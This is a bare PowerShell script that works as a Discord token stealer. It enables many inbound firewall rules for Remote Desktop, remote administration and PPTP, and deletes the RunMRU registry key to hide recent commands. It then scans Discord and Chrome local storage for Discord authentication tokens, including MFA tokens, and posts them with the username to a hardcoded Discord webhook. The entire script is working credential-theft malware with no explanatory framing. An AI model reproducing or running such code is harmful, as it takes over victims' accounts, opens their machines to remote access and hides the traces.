Enable-NetFirewallRule -Name "RemoteAssistance-DCOM-In-TCP-NoScope-Active"
Enable-NetFirewallRule -Name "RemoteDesktop-Shadow-In-TCP"
Enable-NetFirewallRule -Name "RemoteDesktop-UserMode-In-TCP"
Enable-NetFirewallRule -Name "RemoteDesktop-UserMode-In-UDP"
Enable-NetFirewallRule -Name "RemoteDesktop-In-TCP-WS"
Enable-NetFirewallRule -Name "RemoteDesktop-In-TCP-WSS"
Enable-NetFirewallRule -Name "RemoteEventLogSvc-NP-In-TCP-NoScope"
Enable-NetFirewallRule -Name "RemoteEventLogSvc-In-TCP-NoScope"
Enable-NetFirewallRule -Name "RemoteEventLogSvc-RPCSS-In-TCP-NoScope"
Enable-NetFirewallRule -Name "EventForwarder-In-TCP"
Enable-NetFirewallRule -Name "EventForwarder-RPCSS-In-TCP"
Enable-NetFirewallRule -Name "RemoteTask-In-TCP-NoScope"
Enable-NetFirewallRule -Name "RemoteTask-RPCSS-In-TCP-NoScope"
Enable-NetFirewallRule -Name "RemoteSvcAdmin-NP-In-TCP-NoScope"
Enable-NetFirewallRule -Name "RemoteSvcAdmin-In-TCP-NoScope"
Enable-NetFirewallRule -Name "RemoteSvcAdmin-RPCSS-In-TCP-NoScope"
Enable-NetFirewallRule -Name "Wininit-Shutdown-In-Rule-TCP-RPC-EPMapper"
Enable-NetFirewallRule -Name "Wininit-Shutdown-In-Rule-TCP-RPC"
Enable-NetFirewallRule -Name "RVM-VDS-In-TCP-NoScope"
Enable-NetFirewallRule -Name "RVM-VDSLDR-In-TCP-NoScope"
Enable-NetFirewallRule -Name "RRAS-GRE-In"
Enable-NetFirewallRule -Name "RRAS-L2TP-In-UDP"
Enable-NetFirewallRule -Name "RRAS-PPTP-In-TCP"
Remove-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Recurse
$files = Get-ChildItem -Path @("$env:APPDATA/discord/Local Storage/leveldb", "$env:LOCALAPPDATA/google/chrome/user data/default/Local Storage/leveldb") -Include @('*.ldb','*.log') -Recurse -Force
$list = @()
foreach ($file in $files) {
	$result = select-string -Path $file.FullName.ToString() -Pattern @("[\w-]{24}\.[\w-]{6}\.[\w-]{27}", "mfa\.[\w-]{84}") -AllMatches | % { $_.Matches } | % { $_.Value }
	$list += $result
}
$listout = $list | Out-String
$data = "Data for $env:UserName`n`n" + $listout
Invoke-RestMethod -Uri "https://discord.com/api/webhooks/868295869512941579/MnJMt_x0oiqGR5LwYazN0AL7hXu9POXyfONEH5xJG9Wo2QB8EFr3uDZ4QGPc1Uv0ewvQ" -Method POST -Body ([PSCustomObject]@{content = $data} | ConvertTo-Json) -ContentType 'Application/Json'
